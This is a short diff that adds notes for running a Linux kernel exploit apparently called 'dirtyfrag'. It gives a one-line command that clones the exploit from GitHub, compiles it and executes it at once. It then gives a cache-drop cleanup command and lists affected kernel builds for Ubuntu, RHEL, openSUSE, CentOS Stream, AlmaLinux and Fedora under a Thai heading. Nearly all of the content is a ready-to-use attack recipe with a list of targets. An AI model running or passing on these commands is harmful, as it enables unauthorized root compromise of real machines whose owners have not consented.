@@ -1,0 +1,13 @@
+#Exploiting
+git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+
+#Cleanup
+echo 3 > /proc/sys/vm/drop_caches
+
+#ลีกนุกซ์ที่ได้รับผลกระทบ
+Ubuntu 24.04.4: 6.17.0-23-generic
+RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
+openSUSE Tumbleweed: 7.0.2-1-default
+CentOS Stream 10: 6.12.0-224.el10.x86_64
+AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
+Fedora 44: 6.19.14-300.fc44.x86_64
